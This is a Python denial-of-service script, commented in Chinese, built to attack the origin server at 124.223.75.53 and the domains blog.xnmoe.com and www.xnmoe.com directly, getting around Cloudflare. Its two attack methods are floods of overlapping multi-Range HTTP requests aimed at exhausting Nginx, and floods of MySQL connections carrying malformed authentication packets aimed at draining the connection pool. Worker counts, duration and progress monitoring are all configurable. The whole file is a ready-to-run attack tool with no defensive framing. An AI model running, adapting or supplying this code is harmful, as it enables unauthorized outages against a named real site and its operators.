#!/usr/bin/env python3
"""
直攻源站 124.223.75.53 — 绕过Cloudflare
策略: Range IO(Nginx) + MySQL连接耗尽 + HTTP洪水
"""
import asyncio
import aiohttp
import socket
import time
import random
import os
import uuid

ORIGIN = "124.223.75.53"
DURATION = int(os.environ.get("DURATION", "600"))
WORKERS = int(os.environ.get("WORKERS", "50"))
NODE_ID = os.environ.get("NODE_ID", "0")

# 大文件路径 - 用备案页能找到的路径
# 备案页是Nginx默认站点，资源有限
TARGET_FILES = [
    # 备案页本身
    "/",
    "/favicon.ico",
    # 常见Nginx默认路径
    "/index.html",
]

# 超激进Range
RANGES = [
    "bytes=0-,64-,128-,256-,512-,1024-,2048-,4096-",
    "bytes=0-,128-,1024-,2048-,4096-,8192-",
    "bytes=0-,256-,512-,1024-,2048-,4096-,8192-,16384-",
]

stats = {
    "http_ok": 0, "http_to": 0, "http_err": 0,
    "mysql_conn": 0, "mysql_err": 0,
}
lock = asyncio.Lock()


async def range_blaster(session, wid):
    """Range IO 攻击源站 Nginx 80端口"""
    while True:
        f = random.choice(TARGET_FILES)
        rng = random.choice(RANGES)
        # 尝试各种Host头
        host = random.choice([
            "blog.xnmoe.com",
            "www.xnmoe.com",
            "124.223.75.53",
        ])
        try:
            async with session.get(f"http://{ORIGIN}{f}", headers={
                "Range": rng,
                "Host": host,
                "User-Agent": f"Mozilla/5.0 D-{NODE_ID}-{wid}",
            }, timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
                await resp.read()
                async with lock:
                    stats["http_ok"] += 1
        except asyncio.TimeoutError:
            async with lock:
                stats["http_to"] += 1
        except:
            async with lock:
                stats["http_err"] += 1


async def mysql_flooder():
    """MySQL 连接洪水 — 耗尽连接池"""
    while True:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ORIGIN, 3306), timeout=5
            )
            # 读MySQL握手包
            try:
                data = await asyncio.wait_for(reader.read(1024), timeout=3)
                if data and len(data) > 4:
                    # 发送畸形认证包消耗服务端资源
                    fake_auth = b'\x00' * 1000 + b'\x00\x00\x00\x00' + os.urandom(100)
                    writer.write(fake_auth)
                    await writer.drain()
            except:
                pass
            writer.close()
            async with lock:
                stats["mysql_conn"] += 1
        except:
            async with lock:
                stats["mysql_err"] += 1
        await asyncio.sleep(0.05)


async def monitor():
    t0 = time.time()
    while True:
        await asyncio.sleep(15)
        async with lock:
            h_ok, h_to, h_err = stats["http_ok"], stats["http_to"], stats["http_err"]
            m_ok, m_err = stats["mysql_conn"], stats["mysql_err"]
        elapsed = time.time() - t0
        print(f"  [{time.strftime('%H:%M:%S')}] {elapsed:.0f}s | "
              f"HTTP OK:{h_ok} TO:{h_to} ERR:{h_err} | MySQL CONN:{m_ok} ERR:{m_err}",
              flush=True)


async def main():
    print(f"\n{'='*60}")
    print(f" DIRECT ORIGIN ATTACK: {ORIGIN}")
    print(f" Node: {NODE_ID} | Workers: {WORKERS}")
    print(f" Vectors: Range IO + MySQL flood")
    print(f" Duration: {DURATION}s")
    print(f"{'='*60}\n")

    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        asyncio.create_task(monitor())

        # 70% Range IO, 30% MySQL
        http_workers = int(WORKERS * 0.7)
        mysql_workers = WORKERS - http_workers

        tasks = []
        for i in range(http_workers):
            tasks.append(asyncio.create_task(range_blaster(session, i)))
        for i in range(mysql_workers):
            tasks.append(asyncio.create_task(mysql_flooder()))

        try:
            await asyncio.sleep(DURATION)
        finally:
            for t in tasks:
                t.cancel()

    async with lock:
        h_ok, h_to, h_err = stats["http_ok"], stats["http_to"], stats["http_err"]
        m_ok, m_err = stats["mysql_conn"], stats["mysql_err"]
    print(f"\n{'='*60}")
    print(f" FINAL: HTTP OK:{h_ok} TO:{h_to} ERR:{h_err}")
    print(f" MySQL CONN:{m_ok} ERR:{m_err}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    asyncio.run(main())
